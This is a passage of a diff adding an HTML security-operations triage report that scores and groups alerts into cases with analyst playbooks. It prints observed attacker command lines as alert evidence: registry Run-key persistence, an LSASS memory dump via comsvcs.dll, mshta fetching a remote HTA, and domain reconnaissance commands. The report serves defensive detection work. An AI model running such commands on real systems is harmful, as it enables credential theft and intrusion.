+          <div class="facts"><span class="fact">host <b>WKSTN-0412</b></span></div>
+          <pre>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OfficeUpdater /t REG_SZ /d &quot;C:\Users\Public\a.exe&quot; /f</pre>
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td colspan="5" class="muted">no indicators referenced</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+30</td><td><strong>Detection severity: Medium</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+24</td><td><strong>Correlation: 7 ATT&amp;CK tactics on this account</strong><br><span class="muted">this account&#x27;s alerts span multiple consecutive ATT&amp;CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -&gt; Execution -&gt; Persistence -&gt; Defense Evasion -&gt; Credential Access -&gt; Discovery -&gt; Command and Control)</span></td></tr><tr><td class="pts">+10</td><td><strong>Correlation: repeated detection (RECON-BURST x3)</strong><br><span class="muted">the same detection fired repeatedly for this account</span></td></tr><tr><td class="pts">+12</td><td><strong>Correlation: 10 alerts within 10 minutes</strong><br><span class="muted">many alerts for this account landed inside a short window</span></td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend analyst pickup within the SLA and a decision on containment.</p>
+          <ol class="playbook"><li>Enumerate autoruns, scheduled tasks and services created in the alert window.</li><li>Preserve the persistence artifact before removing it.</li><li>Verify the referenced binary&#x27;s signature and hash.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+      <details class="alert critical">
+        <summary>
+          <span class="score-pill critical">96</span>
+          <span class="a-rule">Credential-dumping indicators</span>
+          <span class="a-meta">2026-08-20T09:47:55 &middot; T1003.001</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">LSASS memory is being dumped to disk, the standard first step of offline credential extraction.</p>
+          <p class="a-meta">log channel PS4104 &middot;
+             ALRT-0010 &middot; detection severity High</p>
+          <div class="facts"><span class="fact">host <b>WKSTN-0412</b></span></div>
+          <pre>rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\Users\Public\lsass.dmp full</pre>
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td colspan="5" class="muted">no indicators referenced</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+50</td><td><strong>Detection severity: High</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+24</td><td><strong>Correlation: 7 ATT&amp;CK tactics on this account</strong><br><span class="muted">this account&#x27;s alerts span multiple consecutive ATT&amp;CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -&gt; Execution -&gt; Persistence -&gt; Defense Evasion -&gt; Credential Access -&gt; Discovery -&gt; Command and Control)</span></td></tr><tr><td class="pts">+10</td><td><strong>Correlation: repeated detection (RECON-BURST x3)</strong><br><span class="muted">the same detection fired repeatedly for this account</span></td></tr><tr><td class="pts">+12</td><td><strong>Correlation: 10 alerts within 10 minutes</strong><br><span class="muted">many alerts for this account landed inside a short window</span></td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend containment now: isolate the host and disable the account pending review.</p>
+          <ol class="playbook"><li>Establish which credentials are actually implicated: a dumped secret store, or accounts targeted by repeated authentication attempts.</li><li>If a credential store or memory dump is involved, treat every credential used on this host as exposed and force a password reset for the affected account and any cached domain accounts.</li><li>If the evidence is failed authentication, check lockout policy and look for any attempt from the same origin that succeeded.</li><li>Pull the authentication trail for the affected accounts and the originating address across the alert window.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+      <details class="alert medium">
+        <summary>
+          <span class="score-pill medium">56</span>
+          <span class="a-rule">Host / domain reconnaissance command</span>
+          <span class="a-meta">2026-08-20T09:48:20 &middot; T1087</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">Built-in discovery commands attackers run soon after gaining access to map the host and domain. Benign individually; suspicious in bursts.</p>
+          <p class="a-meta">log channel SECURITY &middot;
+             ALRT-0011 &middot; detection severity Low</p>
+          <div class="facts"><span class="fact">host <b>WKSTN-0412</b></span></div>
+          <pre>whoami /all</pre>
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td colspan="5" class="muted">no indicators referenced</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+10</td><td><strong>Detection severity: Low</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+24</td><td><strong>Correlation: 7 ATT&amp;CK tactics on this account</strong><br><span class="muted">this account&#x27;s alerts span multiple consecutive ATT&amp;CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -&gt; Execution -&gt; Persistence -&gt; Defense Evasion -&gt; Credential Access -&gt; Discovery -&gt; Command and Control)</span></td></tr><tr><td class="pts">+10</td><td><strong>Correlation: repeated detection (RECON-BURST x3)</strong><br><span class="muted">the same detection fired repeatedly for this account</span></td></tr><tr><td class="pts">+12</td><td><strong>Correlation: 10 alerts within 10 minutes</strong><br><span class="muted">many alerts for this account landed inside a short window</span></td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend queued investigation with the surrounding process tree.</p>
+          <ol class="playbook"><li>Correlate with the account&#x27;s normal behaviour before escalating.</li><li>Discovery alone is weak evidence; look for what came before and after it.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+      <details class="alert medium">
+        <summary>
+          <span class="score-pill medium">56</span>
+          <span class="a-rule">Host / domain reconnaissance command</span>
+          <span class="a-meta">2026-08-20T09:48:26 &middot; T1018</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">Built-in discovery commands attackers run soon after gaining access to map the host and domain. Benign individually; suspicious in bursts.</p>
+          <p class="a-meta">log channel SECURITY &middot;
+             ALRT-0012 &middot; detection severity Low</p>
+          <div class="facts"><span class="fact">host <b>WKSTN-0412</b></span></div>
+          <pre>nltest /dclist:corp.local</pre>
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td colspan="5" class="muted">no indicators referenced</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+10</td><td><strong>Detection severity: Low</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+24</td><td><strong>Correlation: 7 ATT&amp;CK tactics on this account</strong><br><span class="muted">this account&#x27;s alerts span multiple consecutive ATT&amp;CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -&gt; Execution -&gt; Persistence -&gt; Defense Evasion -&gt; Credential Access -&gt; Discovery -&gt; Command and Control)</span></td></tr><tr><td class="pts">+10</td><td><strong>Correlation: repeated detection (RECON-BURST x3)</strong><br><span class="muted">the same detection fired repeatedly for this account</span></td></tr><tr><td class="pts">+12</td><td><strong>Correlation: 10 alerts within 10 minutes</strong><br><span class="muted">many alerts for this account landed inside a short window</span></td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend queued investigation with the surrounding process tree.</p>
+          <ol class="playbook"><li>Correlate with the account&#x27;s normal behaviour before escalating.</li><li>Discovery alone is weak evidence; look for what came before and after it.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+      <details class="alert medium">
+        <summary>
+          <span class="score-pill medium">56</span>
+          <span class="a-rule">Host / domain reconnaissance command</span>
+          <span class="a-meta">2026-08-20T09:48:31 &middot; T1087.002</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">Built-in discovery commands attackers run soon after gaining access to map the host and domain. Benign individually; suspicious in bursts.</p>
+          <p class="a-meta">log channel SECURITY &middot;
+             ALRT-0013 &middot; detection severity Low</p>
+          <div class="facts"><span class="fact">host <b>WKSTN-0412</b></span></div>
+          <pre>net group &quot;Domain Admins&quot; /domain</pre>
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td colspan="5" class="muted">no indicators referenced</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+10</td><td><strong>Detection severity: Low</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+24</td><td><strong>Correlation: 7 ATT&amp;CK tactics on this account</strong><br><span class="muted">this account&#x27;s alerts span multiple consecutive ATT&amp;CK tactics, suggesting a progressing intrusion rather than an isolated event (Initial Access -&gt; Execution -&gt; Persistence -&gt; Defense Evasion -&gt; Credential Access -&gt; Discovery -&gt; Command and Control)</span></td></tr><tr><td class="pts">+10</td><td><strong>Correlation: repeated detection (RECON-BURST x3)</strong><br><span class="muted">the same detection fired repeatedly for this account</span></td></tr><tr><td class="pts">+12</td><td><strong>Correlation: 10 alerts within 10 minutes</strong><br><span class="muted">many alerts for this account landed inside a short window</span></td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend queued investigation with the surrounding process tree.</p>
+          <ol class="playbook"><li>Correlate with the account&#x27;s normal behaviour before escalating.</li><li>Discovery alone is weak evidence; look for what came before and after it.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+    </div>
+  </section>
+  <section class="case">
+    <div class="case-top high">
+      <div class="dial" style="background:conic-gradient(#e05d1f 281deg,#e3e6ea 281deg)"><span>78</span></div>
+      <div class="case-main">
+        <div class="case-id">Case #2 &middot; High</div>
+        <div class="case-account">CORP\mkaya</div>
+        <p class="case-summary">2 alert(s) on CORP\mkaya, on VPN-GW-01, SRV-FILE-02, driven from outside the network via 198.51.100.30, spanning Credential Access -&gt; Lateral Movement.</p>
+        <div class="facts">
+          <span class="fact">queue <b>Tier 2</b></span>
+          <span class="fact">SLA <b>1 h</b></span>
+          <span class="fact">account <b>standard</b></span>
+          <span class="fact">alerts <b>2</b></span>
+          <span class="fact">window <b>2026-08-20 03:12:19 &ndash; 2026-08-20 09:50:12</b></span>
+        </div>
+        <div class="origin-row"><span class="origin-label">affected hosts</span><span class="asset-chip">VPN-GW-01</span><span class="asset-chip">SRV-FILE-02</span></div><div class="origin-row"><span class="origin-label">originated from</span><span class="origin-chip internal">10.20.7.41<em>internal &middot; internal</em></span><span class="origin-chip external">198.51.100.30<em>external &middot; suspicious</em></span></div>
+        <ol class="chain"><li><span class="step-dot"></span>Credential Access</li><li><span class="step-dot"></span>Lateral Movement</li></ol>
+        <div><span class="ioc-chip suspicious">198.51.100.30</span></div>
+      </div>
+    </div>
+    <div class="case-alerts">
+      <h3>Alerts in this case (2 of 2)</h3>
+      
+      <details class="alert high">
+        <summary>
+          <span class="score-pill high">78</span>
+          <span class="a-rule">Repeated failed logons for a single account</span>
+          <span class="a-meta">2026-08-20T03:12:19 &middot; T1110.003</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">Several failed authentication attempts for one account in quick succession. Individually weak evidence - users mistype passwords - but the pattern matters when it repeats across accounts.</p>
+          <p class="a-meta">log channel SECURITY &middot;
+             ALRT-0002 &middot; detection severity Low</p>
+          <div class="facts"><span class="fact">host <b>VPN-GW-01</b></span><span class="fact">from <b>198.51.100.30</b> (external)</span><span class="fact">logon type <b>3</b></span></div>
+          
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td><span class="role source">source</span></td><td>ip</td><td class="mono">198.51.100.30</td><td><span class="verdict suspicious">suspicious</span> </td><td class="muted">Low-confidence abuse reports, mostly authentication brute-force. Not conclusive on its own - the shared-origin correlation is what makes it matter here.</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+10</td><td><strong>Detection severity: Low</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+20</td><td><strong>Threat intel: 198.51.100.30 (source) = suspicious</strong><br><span class="muted">indicator has partial / low-confidence detections</span></td></tr><tr><td class="pts">+10</td><td><strong>Context: 03:12 is outside business hours</strong><br><span class="muted">activity occurred outside configured business hours</span></td></tr><tr><td class="pts">+18</td><td><strong>Context: session originated externally from 198.51.100.30</strong><br><span class="muted">the session originated from a routable external address rather than the console of the affected host - someone drove this from outside the network</span></td></tr><tr><td class="pts">+20</td><td><strong>Correlation: origin 198.51.100.30 touched 3 accounts within 30 minutes (ademir, jdoe, mkaya)</strong><br><span class="muted">one origin address touched several different accounts in a short window - the signature of password spraying, credential stuffing, or one stolen credential being reused across the network. Grouping alerts by account cannot see this: each account shows only a single unremarkable alert</span></td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend analyst pickup within the SLA and a decision on containment.</p>
+          <ol class="playbook"><li>Establish which credentials are actually implicated: a dumped secret store, or accounts targeted by repeated authentication attempts.</li><li>If a credential store or memory dump is involved, treat every credential used on this host as exposed and force a password reset for the affected account and any cached domain accounts.</li><li>If the evidence is failed authentication, check lockout policy and look for any attempt from the same origin that succeeded.</li><li>Pull the authentication trail for the affected accounts and the originating address across the alert window.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+      <details class="alert medium">
+        <summary>
+          <span class="score-pill medium">60</span>
+          <span class="a-rule">Interactive logon to a server from a workstation</span>
+          <span class="a-meta">2026-08-20T09:50:12 &middot; T1021.001</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">A remote interactive (RDP) session was opened against a server, and the origin is an ordinary user workstation rather than an admin jump host. This is the shape of lateral movement with harvested credentials.</p>
+          <p class="a-meta">log channel SECURITY &middot;
+             ALRT-0014 &middot; detection severity High</p>
+          <div class="facts"><span class="fact">host <b>SRV-FILE-02</b></span><span class="fact">from <b>10.20.7.41</b> (internal)</span><span class="fact">logon type <b>10</b></span></div>
+          
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td><span class="role source">source</span></td><td>ip</td><td class="mono">10.20.7.41</td><td><span class="verdict internal">internal</span> </td><td class="muted">internal address - no external reputation applies</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+50</td><td><strong>Detection severity: High</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+10</td><td><strong>Context: session originated from another internal host (10.20.7.41)</strong><br><span class="muted">the session originated from another host on the internal network, which is the shape of lateral movement rather than local use</span></td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend queued investigation with the surrounding process tree.</p>
+          <ol class="playbook"><li>Identify the origin host and treat it as compromised until proven otherwise.</li><li>Pull the authentication trail: which accounts authenticated from that origin, and to what.</li><li>Check whether the credential used here was exposed by an earlier alert on the origin host.</li><li>Map what the destination host gives access to before deciding on containment.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+    </div>
+  </section>
+  <section class="case">
+    <div class="case-top high">
+      <div class="dial" style="background:conic-gradient(#e05d1f 281deg,#e3e6ea 281deg)"><span>78</span></div>
+      <div class="case-main">
+        <div class="case-id">Case #3 &middot; High</div>
+        <div class="case-account">CORP\ademir</div>
+        <p class="case-summary">1 alert(s) on CORP\ademir, on VPN-GW-01, driven from outside the network via 198.51.100.30, spanning Credential Access.</p>
+        <div class="facts">
+          <span class="fact">queue <b>Tier 2</b></span>
+          <span class="fact">SLA <b>1 h</b></span>
+          <span class="fact">account <b>standard</b></span>
+          <span class="fact">alerts <b>1</b></span>
+          <span class="fact">window <b>2026-08-20 03:12:41 &ndash; 2026-08-20 03:12:41</b></span>
+        </div>
+        <div class="origin-row"><span class="origin-label">affected host</span><span class="asset-chip">VPN-GW-01</span></div><div class="origin-row"><span class="origin-label">originated from</span><span class="origin-chip external">198.51.100.30<em>external &middot; suspicious</em></span></div>
+        <ol class="chain"><li><span class="step-dot"></span>Credential Access</li></ol>
+        <div><span class="ioc-chip suspicious">198.51.100.30</span></div>
+      </div>
+    </div>
+    <div class="case-alerts">
+      <h3>Alerts in this case (1 of 1)</h3>
+      
+      <details class="alert high">
+        <summary>
+          <span class="score-pill high">78</span>
+          <span class="a-rule">Repeated failed logons for a single account</span>
+          <span class="a-meta">2026-08-20T03:12:41 &middot; T1110.003</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">Several failed authentication attempts for one account in quick succession. Individually weak evidence - users mistype passwords - but the pattern matters when it repeats across accounts.</p>
+          <p class="a-meta">log channel SECURITY &middot;
+             ALRT-0003 &middot; detection severity Low</p>
+          <div class="facts"><span class="fact">host <b>VPN-GW-01</b></span><span class="fact">from <b>198.51.100.30</b> (external)</span><span class="fact">logon type <b>3</b></span></div>
+          
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td><span class="role source">source</span></td><td>ip</td><td class="mono">198.51.100.30</td><td><span class="verdict suspicious">suspicious</span> </td><td class="muted">Low-confidence abuse reports, mostly authentication brute-force. Not conclusive on its own - the shared-origin correlation is what makes it matter here.</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+10</td><td><strong>Detection severity: Low</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+20</td><td><strong>Threat intel: 198.51.100.30 (source) = suspicious</strong><br><span class="muted">indicator has partial / low-confidence detections</span></td></tr><tr><td class="pts">+10</td><td><strong>Context: 03:12 is outside business hours</strong><br><span class="muted">activity occurred outside configured business hours</span></td></tr><tr><td class="pts">+18</td><td><strong>Context: session originated externally from 198.51.100.30</strong><br><span class="muted">the session originated from a routable external address rather than the console of the affected host - someone drove this from outside the network</span></td></tr><tr><td class="pts">+20</td><td><strong>Correlation: origin 198.51.100.30 touched 3 accounts within 30 minutes (ademir, jdoe, mkaya)</strong><br><span class="muted">one origin address touched several different accounts in a short window - the signature of password spraying, credential stuffing, or one stolen credential being reused across the network. Grouping alerts by account cannot see this: each account shows only a single unremarkable alert</span></td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend analyst pickup within the SLA and a decision on containment.</p>
+          <ol class="playbook"><li>Establish which credentials are actually implicated: a dumped secret store, or accounts targeted by repeated authentication attempts.</li><li>If a credential store or memory dump is involved, treat every credential used on this host as exposed and force a password reset for the affected account and any cached domain accounts.</li><li>If the evidence is failed authentication, check lockout policy and look for any attempt from the same origin that succeeded.</li><li>Pull the authentication trail for the affected accounts and the originating address across the alert window.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+    </div>
+  </section>
+  <section class="case">
+    <div class="case-top medium">
+      <div class="dial" style="background:conic-gradient(#b8860b 216deg,#e3e6ea 216deg)"><span>60</span></div>
+      <div class="case-main">
+        <div class="case-id">Case #4 &middot; Medium</div>
+        <div class="case-account">CORP\svc_backup</div>
+        <p class="case-summary">2 alert(s) on CORP\svc_backup, on SRV-BKP-01, spanning Persistence -&gt; Defense Evasion.</p>
+        <div class="facts">
+          <span class="fact">queue <b>Tier 1</b></span>
+          <span class="fact">SLA <b>4 h</b></span>
+          <span class="fact">account <b>service</b></span>
+          <span class="fact">alerts <b>2</b></span>
+          <span class="fact">window <b>2026-08-20 02:17:44 &ndash; 2026-08-20 02:19:03</b></span>
+        </div>
+        <div class="origin-row"><span class="origin-label">affected host</span><span class="asset-chip">SRV-BKP-01</span></div>
+        <ol class="chain"><li><span class="step-dot"></span>Persistence</li><li><span class="step-dot"></span>Defense Evasion</li></ol>
+        <div></div>
+      </div>
+    </div>
+    <div class="case-alerts">
+      <h3>Alerts in this case (2 of 2)</h3>
+      
+      <details class="alert medium">
+        <summary>
+          <span class="score-pill medium">60</span>
+          <span class="a-rule">Signed-binary proxy execution (LOLBin)</span>
+          <span class="a-meta">2026-08-20T02:17:44 &middot; T1218.005</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">A signed Microsoft binary is used to execute remote script content, bypassing application allow-listing.</p>
+          <p class="a-meta">log channel SYSMON &middot;
+             ALRT-0015 &middot; detection severity Medium</p>
+          <div class="facts"><span class="fact">host <b>SRV-BKP-01</b></span></div>
+          <pre>mshta.exe http://192.0.2.47/maint.hta</pre>
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td><span class="role destination">destination</span></td><td>url</td><td class="mono">http://192.0.2.47/maint.hta</td><td><span class="verdict unknown">unknown</span> </td><td class="muted">URL kept as context; its host is enriched separately</td></tr><tr><td><span class="role destination">destination</span></td><td>ip</td><td class="mono">192.0.2.47</td><td><span class="verdict unknown">unknown</span> </td><td class="muted">No reputation data. Unknown is not the same as clean - it means nobody has reported it yet.</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+30</td><td><strong>Detection severity: Medium</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+10</td><td><strong>Context: 02:17 is outside business hours</strong><br><span class="muted">activity occurred outside configured business hours</span></td></tr><tr><td class="pts">+12</td><td><strong>Context: service account</strong><br><span class="muted">a service account ran interactive-looking commands</span></td></tr><tr><td class="pts">+8</td><td><strong>Context: external destination referenced</strong><br><span class="muted">the command line references a routable external address</span></td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend queued investigation with the surrounding process tree.</p>
+          <ol class="playbook"><li>Verify endpoint protection is still enabled and reporting.</li><li>Review any exclusion paths that were added and remove unapproved ones.</li><li>Assume telemetry gaps for the period after the tampering.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+      <details class="alert medium">
+        <summary>
+          <span class="score-pill medium">52</span>
+          <span class="a-rule">Scheduled-task creation</span>
+          <span class="a-meta">2026-08-20T02:19:03 &middot; T1053.005</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">A scheduled task is registered to run a program on a trigger, used both for legitimate automation and for persistence.</p>
+          <p class="a-meta">log channel SECURITY &middot;
+             ALRT-0016 &middot; detection severity Medium</p>
+          <div class="facts"><span class="fact">host <b>SRV-BKP-01</b></span></div>
+          <pre>schtasks /create /tn &quot;BackupVerify&quot; /tr &quot;C:\ProgramData\bkp\verify.exe&quot; /sc hourly /ru SYSTEM /f</pre>
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td colspan="5" class="muted">no indicators referenced</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+30</td><td><strong>Detection severity: Medium</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+10</td><td><strong>Context: 02:19 is outside business hours</strong><br><span class="muted">activity occurred outside configured business hours</span></td></tr><tr><td class="pts">+12</td><td><strong>Context: service account</strong><br><span class="muted">a service account ran interactive-looking commands</span></td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend queued investigation with the surrounding process tree.</p>
+          <ol class="playbook"><li>Enumerate autoruns, scheduled tasks and services created in the alert window.</li><li>Preserve the persistence artifact before removing it.</li><li>Verify the referenced binary&#x27;s signature and hash.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+    </div>
+  </section>
+  <section class="case">
+    <div class="case-top medium">
+      <div class="dial" style="background:conic-gradient(#b8860b 155deg,#e3e6ea 155deg)"><span>43</span></div>
+      <div class="case-main">
+        <div class="case-id">Case #5 &middot; Medium</div>
+        <div class="case-account">CORP\admin_bt</div>
+        <p class="case-summary">2 alert(s) on CORP\admin_bt, on WKSTN-0331, spanning Execution -&gt; Defense Evasion.</p>
+        <div class="facts">
+          <span class="fact">queue <b>Tier 1</b></span>
+          <span class="fact">SLA <b>4 h</b></span>
+          <span class="fact">account <b>privileged</b></span>
+          <span class="fact">alerts <b>2</b></span>
+          <span class="fact">window <b>2026-08-20 14:02:11 &ndash; 2026-08-20 14:05:47</b></span>
+        </div>
+        <div class="origin-row"><span class="origin-label">affected host</span><span class="asset-chip">WKSTN-0331</span></div>
+        <ol class="chain"><li><span class="step-dot"></span>Execution</li><li><span class="step-dot"></span>Defense Evasion</li></ol>
+        <div></div>
+      </div>
+    </div>
+    <div class="case-alerts">
+      <h3>Alerts in this case (2 of 2)</h3>
+      
+      <details class="alert low">
+        <summary>
+          <span class="score-pill low">25</span>
+          <span class="a-rule">Large Base64 blob</span>
+          <span class="a-meta">2026-08-20T14:02:11 &middot; T1027</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">A long Base64 string was observed. Often benign (certificates, configuration), but also how payloads are smuggled - corroborating signal only.</p>
+          <p class="a-meta">log channel PS4104 &middot;
+             ALRT-0017 &middot; detection severity Low</p>
+          <div class="facts"><span class="fact">host <b>WKSTN-0331</b></span></div>
+          <pre>$cert = [Convert]::ToBase64String((Get-Content -Encoding Byte .\deploy\signing.cer)); Set-Content .\deploy\signing.b64 $cert</pre>
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td colspan="5" class="muted">no indicators referenced</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+10</td><td><strong>Detection severity: Low</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">+15</td><td><strong>Context: privileged account</strong><br><span class="muted">the acting account matches a privileged-account pattern</span></td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend batch review; close with a note if the context is benign.</p>
+          <ol class="playbook"><li>Verify endpoint protection is still enabled and reporting.</li><li>Review any exclusion paths that were added and remove unapproved ones.</li><li>Assume telemetry gaps for the period after the tampering.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+      <details class="alert medium">
+        <summary>
+          <span class="score-pill medium">43</span>
+          <span class="a-rule">Execution-policy-bypass PowerShell</span>
+          <span class="a-meta">2026-08-20T14:05:47 &middot; T1059.001</span>
+        </summary>
+        <div class="a-body">
+          <p class="why">PowerShell was launched with -ExecutionPolicy Bypass to run a script off a remote share. Common in both software deployment and malicious one-liners - confirm the share and the script are approved.</p>
+          <p class="a-meta">log channel PS4104 &middot;
+             ALRT-0018 &middot; detection severity Medium</p>
+          <div class="facts"><span class="fact">host <b>WKSTN-0331</b></span></div>
+          <pre>powershell.exe -ExecutionPolicy Bypass -File \\10.20.5.14\deploy$\Install-Agent.ps1 -DnsCheck 8.8.8.8</pre>
+          
+          <h4>Indicators</h4>
+          <table class="grid"><tr><th>Role</th><th>Type</th><th>Value</th><th>Verdict</th><th>Note</th></tr><tr><td><span class="role destination">destination</span></td><td>ip</td><td class="mono">10.20.5.14</td><td><span class="verdict internal">internal</span> </td><td class="muted">internal address - no external reputation applies</td></tr><tr><td><span class="role destination">destination</span></td><td>ip</td><td class="mono">8.8.8.8</td><td><span class="verdict clean">clean</span> </td><td class="muted">Google Public DNS. Well-known infrastructure, treated as benign.</td></tr></table>
+          <h4>Why this score</h4>
+          <table class="grid breakdown"><tr><td class="pts">+30</td><td><strong>Detection severity: Medium</strong><br><span class="muted">starting weight assigned by the detection rule that fired</span></td></tr><tr><td class="pts">-10</td><td><strong>Threat intel: 8.8.8.8 (destination) = clean</strong><br><span class="muted">indicator is well-known benign infrastructure</span></td></tr><tr><td class="pts">+15</td><td><strong>Context: privileged account</strong><br><span class="muted">the acting account matches a privileged-account pattern</span></td></tr><tr><td class="pts">+8</td><td><strong>Context: external destination referenced</strong><br><span class="muted">the command line references a routable external address</span></td></tr></table>
+          <h4>Recommended next steps</h4>
+          <p class="action">Recommend queued investigation with the surrounding process tree.</p>
+          <ol class="playbook"><li>Decode and read the actual command before judging intent.</li><li>Determine whether the interpreter run is user-initiated or spawned by another process.</li><li>Confirm the parent process chain or the session context, whichever the telemetry carries.</li><li>Check whether a change ticket or deployment window explains this activity.</li><li>Record the verdict on the alert so the rule can be tuned.</li></ol>
+        </div>
+      </details>
+    </div>
+  </section>
+</main>
+<footer>
+  Work the cases top to bottom &mdash; each one is a single decision, not a row to close.<br>
